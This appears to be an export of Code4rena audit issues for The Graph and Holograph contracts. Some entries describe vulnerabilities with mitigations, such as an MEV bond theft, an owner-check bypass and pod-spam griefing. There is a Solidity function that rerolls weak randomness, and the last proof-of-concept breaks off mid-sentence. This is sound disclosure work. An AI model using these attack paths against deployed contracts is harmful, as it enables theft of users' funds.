[{"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/37", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/33", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/31", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/29", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-10-thegraph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/27", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/20", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/19", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-10-thegraph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/18", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/15", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-10-thegraph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/14", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/12", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/10", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-10-thegraph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/6", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-10-thegraph-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-thegraph-findings/issues/1", "labels": [], "target": "2022-10-thegraph-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/501", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/499", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/492", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/484", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/480", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "`_payoutEth()` calculates `balance` with an offset, always leaving dust `ETH` in the contract", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/476", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395   # Vulnerability details  Payout recipients can call `getEthPayout()` to transfer the ETH balance of the contract to all payout recipients. This function makes an internal call to `_payoutEth`, which sends the payment to the recipients based on their associated `bp`  The issue is that the `balance` used in the `transfer` calls is not the contract ETH balance, but the balance minus a `gasCost`.  This means `getEthPayout()` calls will leave dust in the contract.  ## Impact  If the dust is small enough, a subsequent call to `getEthPayout` is likely to revert because of [this check](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390). And `enforcer/PA1D` does not have any other ETH withdrawal function. While `enforcer/PA1D` is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.  ## Proof-Of-Concept  Let us take the example of a payout recipient trying to retrieve their share of the balance, equal to `40_000` For simplicity, assume one payout address, owned by Alice:  - Alice calls `getEthPayout()`, which in turn calls `_payoutEth()` - `gasCost = (23300 * length) + length = 23300 + 1 = 23301` - `balance = address(this).balance = 40000` - `balance - gasCost = 40000 - 23301 = 16699`, - `sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699` - Alice receives `16699`.  Alice has to wait for the balance to increase to call `getEthPayout()` again. But no matter what, there will always be at least a dust of `10000` left in the contract.   ## Tools Used  Manual Analysis   ## Mitigation  The transfers should be done based on `address(this).balance`. The `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`, the contract does not have to provide gas.  ```diff -391: balance = balance - gasCost; 392:     uint256 sending; 393:     // uint256 sent; 394:     for (uint256 i = 0; i < length; i++) { 395:       sending = ((bps[i] * balance) / 10000); 396:       addresses[i].transfer(sending); 397:       // sent = sent + sending; 398:     } ```"}, {"title": "MEV: Operator can bribe miner and steal honest operator's bond amount if gas price went high", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/473", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Description Operators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.  If the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.  The docs and code state that if there was a gas spike in the operator's slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob: ``` require(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\"); ```  However, there is still a way for operator to claim primary operator's bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional \"bribe\" transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.  info about coinbase [transfer](https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment) info about bundle [selection](https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula)  ## Impact  Dishonest operator can take honest operator's bond amount although gas price is above acceptable limits.  ## Tools Used  Manual audit, flashbot docs  ## Recommended Mitigation Steps  Do not use current tx.gasprice amount to infer gas price in a previous block.  Probably best to use gas price oracle."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/472", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "MED - Incorrect implementation of ERC721 may have bad consequences for receiver", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/469", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code: ``` if (_isContract(to)) {   require(     (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&       ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&       ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==       ERC721TokenReceiver.onERC721Received.selector),     \"ERC721: onERC721Received fail\"   ); } ``` If the target address is a contract, the enforcer requires the target's onERC721Received() to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721): ``` interface ERC721TokenReceiver {     /// @notice Handle the receipt of an NFT     /// @dev The ERC721 smart contract calls this function on the recipient     ///  after a `transfer`. This function MAY throw to revert and reject the     ///  transfer. Return of other than the magic value MUST result in the     ///  transaction being reverted.     ///  Note: the contract address is always the message sender.     /// @param _operator The address which called `safeTransferFrom` function     /// @param _from The address which previously owned the token     /// @param _tokenId The NFT identifier which is being transferred     /// @param _data Additional data with no specified format     /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`     ///  unless throwing     function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4); } ```  The standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the address(this) value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.  ## Impact  ERC721 transferFrom's \"to\" contract may fail to accept transfers, or record credit of transfers incorrectly.   ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Pass the msg.sender parameter, as the ERC721 standard requires."}, {"title": "MED: leak of value when interacting with an ERC721 enforcer contract", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/468", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.   If Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.  ## Impact  Leak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer's receive() function.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Funnel receive() empty calls down to the implementation."}, {"title": "MED: isOwner / onlyOwner checks can be bypassed by attacker in ERC721/ERC20 implementations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/464", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121   # Vulnerability details  ## Description  ERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.  The issue comes from confusion between calls coming from HolographERC721's fallback function, and calls from actually implemented functions.   In the fallback function, the enforcer appends an additional 32 bytes of msg.sender : ``` assembly {   calldatacopy(0, 0, calldatasize())   mstore(calldatasize(), caller())   let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)   returndatacopy(0, 0, returndatasize())   switch result   case 0 {     revert(0, returndatasize())   }   default {     return(0, returndatasize())   } } ```  Indeed these are the bytes read as msgSender: ``` function msgSender() internal pure returns (address sender) {   assembly {     sender := calldataload(sub(calldatasize(), 0x20))   } } ```  and isOwner simply compares these to the stored owner: ``` function isOwner() external view returns (bool) {   if (msg.sender == holographer()) {     return msgSender() == _getOwner();   } else {     return msg.sender == _getOwner();   } } ```  However, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom: ``` function safeTransferFrom(   address from,   address to,   uint256 tokenId,   bytes memory data ) public payable {   require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");   if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {     require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));   }   _transferFrom(from, to, tokenId);   if (_isContract(to)) {     require(       (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&         ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&         ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==         ERC721TokenReceiver.onERC721Received.selector),       \"ERC721: onERC721Received fail\"     );   }   if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {     require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));   } } ```  Here, caller has arbitrary control of the data parameter, and can pass owner's address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.  Therefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.   This pattern occurs with the following functions, which have an arbitrary data parameter: - beforeSafeTransfer / after SafeTransfer - beforeTransfer / afterTransfer - beforeOnERC721Received / afterOnERC721Received - beforeOnERC20Received / aferERC20Received  ## Impact  Owner-specific functionality can be initiated on NFT / ERC20 implementation contracts  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Refactor the code to represent msg.sender information in a bug-free way."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/458", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "`_payoutToken[s]()` is not compatible with tokens with missing return value", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/456", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340   # Vulnerability details    ## Impact Payout is blocked and tokens are stuck in contract.  ## Proof of Concept `PA1D._payoutToken()` and `PA1D._payoutTokens()` call `ERC20.transfer()` in a require-statement to send tokens to a list of payout recipients. Some tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a `bool`, for such a token a `void` return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.  ## Tools Used Code inspection  ## Recommended Mitigation Steps Use [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol), which handles the return value check as well as non-standard-compliant tokens."}, {"title": " LayerZeroModule miscalculates gas, risking loss of assets", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/445", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445   # Vulnerability details  ## Description  Holograph gets it's cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ's [RelayerV2](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133)  The issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the *source* chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described [here](https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters)  ## Impact  The impact is that when those fields are different between chains, one of two things may happen: 1. Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero) 2. More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.  The code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Firstly,make sure to use the target gas costs. Secondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/442", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "HolographERC20 breaks composability by forcing usage of draft proposal EIP-4524", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/440", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539   # Vulnerability details  ## Description  HolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls \\_checkOnERC20Received:  ``` if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {   require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data)); } _transfer(account, recipient, amount); require(_checkOnERC20Received(account, recipient, amount, data), \"ERC20: non ERC20Receiver\"); if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {   require(SourceERC20().afterSafeTransfer(account, recipient, amount, data)); } ```  The checkOnERC20Received function: ``` if (_isContract(recipient)) {   try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {     require(erc165support, \"ERC20: no ERC165 support\");     // we have erc165 support     if (ERC165(recipient).supportsInterface(0x534f5876)) {       // we have eip-4524 support       try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv         return retval == ERC20Receiver.onERC20Received.selector;       } catch (bytes memory reason) {         if (reason.length == 0) {           revert(\"ERC20: non ERC20Receiver\");         } else {           assembly {             revert(add(32, reason), mload(reason))           }         }       }     } else {       revert(\"ERC20: eip-4524 not supported\");     }   } catch (bytes memory reason) {     if (reason.length == 0) {       revert(\"ERC20: no ERC165 support\");     } else {       assembly {         revert(add(32, reason), mload(reason))       }     }   } } else {   return true; } ```  In essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that [this](https://eips.ethereum.org/EIPS/eip-4524) EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.  The specs warn us: ``` \u26a0\ufe0f This EIP is not recommended for general use or implementation as it is likely to change.  ```  Therefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.  ## Impact  ERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Remove the EIP-4524 requirements altogether."}, {"title": " Execution may be stuck in destination chain as operators estimate gas consumption", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/433", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": " Execution may be stuck in destination chain as operators estimate gas consumption"}, {"title": " Attacker can force chaotic operator behavior", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/432", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875   # Vulnerability details  ## Description  Operators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():  ``` if (_operatorPods.length < pod) {   /**    * @dev activate pod(s) up until the selected pod    */   for (uint256 i = _operatorPods.length; i <= pod; i++) {     /**      * @dev add zero address into pod to mitigate empty pod issues      */     _operatorPods.push([address(0)]);   } } ```  The issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:  1. bondUtilityToken(attacker, large_amount, high_pod_number) 2. unbondUtilityToken(attacker, attacker)  The above could be wrapped in a flashloan to get virtually any pod tier filled.  The consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as \"open season\". In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.   ## Impact  Any user can force chaotic \"open season\" operator behavior  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  It is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/429", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/428", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Bad source of randomness", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/427", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511   # Vulnerability details  ## Impact Using block.number and block.timestamp as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.  ## Proof of Concept An attack path for rerolling the result of bad randomness might look roughly like this:  ```js function attack(uint256 currentNonce, uint256 wantedPodIndex, uint256 numPods, uint256 wantedOperatorIndex, uint256 numOperators,  bytes calldata bridgeInRequestPayload) external{      bytes32 jobHash = keccak256(bridgeInRequestPayload);      //same calculation as in HolographOperator.crossChainMessage     uint256 random = uint256(keccak256(abi.encodePacked(jobHash, currentNonce, block.number, block.timestamp)));      require(wantedPodIndex == random % numPods)     require(wantedOperatorIndex == random % numOperators);      operator.crossChainMessage(bridgeInRequestPayload); } ```  The attack basically consists of repeatedly calling the `attack` function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/docs/vrf/v2/introduction/).  It should be noted, that in this case there is a prerequirement of the layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/425", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/422", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/420", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/419", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "It is possible that operator loses sent ETH after calling `HolographOperator` contract's `executeJob` function", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/418", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478   # Vulnerability details  ## Impact ETH can be sent when calling the `HolographOperator` contract's `executeJob` function, which can execute the following code. ```solidity File: contracts\\HolographOperator.sol 419:     try 420:       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}( 421:         msg.sender, 422:         bridgeInRequestPayload 423:       ) 424:     { 425:       /// @dev do nothing 426:     } catch { 427:       _failedJobs[hash] = true; 428:       emit FailedOperatorJob(hash); 429:     } ```  Executing the `try ... {...} catch {...}` code mentioned above will execute `HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)`. Calling the `nonRevertingBridgeCall` function can possibly execute `revert(0, 0)` if the external call to the bridge contract is not successful. When this occurs, the code in the `catch` block of the `try ... {...} catch {...}` code mentioned above will run, which does not make calling the `executeJob` function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the `HolographOperator` contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the `executeJob` function will lose the sent ETH.  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 ```solidity   function executeJob(bytes calldata bridgeInRequestPayload) external payable {          ...      /**      * @dev execute the job      */     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     }     /**      * @dev every executed job (even if failed) increments total message counter by one      */     ++_inboundMessageCounter;     /**      * @dev reward operator (with HLG) for executing the job      * @dev this is out of scope and is purposefully omitted from code      */     ////  _bondedOperators[msg.sender] += reward;   } ```  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478 ```solidity   function nonRevertingBridgeCall(address msgSender, bytes calldata payload) external payable {     require(msg.sender == address(this), \"HOLOGRAPH: operator only call\");     assembly {       /**        * @dev remove gas price from end        */       calldatacopy(0, payload.offset, sub(payload.length, 0x20))       /**        * @dev hToken recipient is injected right before making the call        */       mstore(0x84, msgSender)       /**        * @dev make non-reverting call        */       let result := call(         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value         mload(sub(payload.length, 0x40)),         /// @dev destination is bridge contract         sload(_bridgeSlot),         /// @dev any value is passed along         callvalue(),         /// @dev data is retrieved from 0 index memory position         0,         /// @dev everything except for last 32 bytes (gas limit) is sent         sub(payload.length, 0x40),         0,         0       )       if eq(result, 0) {         revert(0, 0)       }       return(0, 0)     }   } ```  ## Proof of Concept First, please add the following `OperatorAndBridgeMocks.sol` file in `src\\mock\\`. ```solidity pragma solidity 0.8.13;  // OperatorMock contract simulates the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions contract OperatorMock {     bool public isJobExecuted = true;      BridgeMock bridgeMock = new BridgeMock();      // testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function     function testExecuteJob() external payable {         try IOperatorMock(address(this)).testBridgeCall{value: msg.value}() {         } catch {             isJobExecuted = false;         }     }          // testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function     function testBridgeCall() external payable {         // as a simulation, the external call that sends ETH to bridgeMock contract will revert         (bool success, ) = address(bridgeMock).call{value: msg.value}(\"\");         if (!success) {             assembly {                 revert(0, 0)             }         }         assembly {             return(0, 0)         }     } }  interface IOperatorMock {     function testBridgeCall() external payable; }  contract BridgeMock {     receive() external payable {         revert();     } } ```  Then, please add the following `POC.ts` file in `test\\`. ```typescript import { expect } from \"chai\"; import { ethers } from \"hardhat\";  describe('POC', () => {     it(\"It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function\", async () => {         // deploy operatorMock contract that simulates         //   the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions         const OperatorMockFactory = await ethers.getContractFactory('OperatorMock');         const operatorMock = await OperatorMockFactory.deploy();         await operatorMock.deployed();          await operatorMock.testExecuteJob({value: 500});          // even though the job is not successfully executed, the sent ETH is locked in operatorMock contract         const isJobExecuted = await operatorMock.isJobExecuted();         expect(isJobExecuted).to.be.eq(false);         expect(await ethers.provider.getBalance(operatorMock.address)).to.be.eq(500);     }); }); ```  Last, please run `npx hardhat test test/POC.ts --network hardhat`. The `It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function` test will pass to demonstrate 